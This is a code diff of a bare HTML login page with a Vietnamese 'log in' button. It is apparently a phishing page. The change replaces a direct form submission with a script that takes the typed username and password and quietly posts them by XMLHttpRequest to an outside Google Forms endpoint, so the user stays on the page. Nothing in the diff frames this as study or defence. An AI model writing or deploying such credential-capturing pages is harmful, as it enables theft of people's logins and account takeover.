@@ -7,12 +7,26 @@
     <title>Document</title>
 </head>
 <body>
-    <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSchWJfKPVsSxannAbiq1kxramKbv9K4DH-M4tjSJyBU5InTfg/formResponse" method="POST">
-        <input type="text" name="entry.1136815632">
+    <form action="#">
+        <input id="username" type="text">
         <br>
-        <input type="password" name="entry.2019635112">
+        <input id="password" type="password">
         <br>
-        <input type="submit" value="Đăng Nhập">
+        <input id="submit" type="submit" value="Đăng Nhập">
     </form>
+    <script>
+        document.getElementById("submit").onclick = function(){
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            var data  = new FormData();
+            data.set('entry.1136815632',username);
+            data.set('entry.2019635112',password);
+            let request = new XMLHttpRequest();
+            var url = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSchWJfKPVsSxannAbiq1kxramKbv9K4DH-M4tjSJyBU5InTfg/formResponse";
+            request.open("POST", url, true);
+            request.send(data);
+        }
+        
+    </script>
 </body>
 </html>
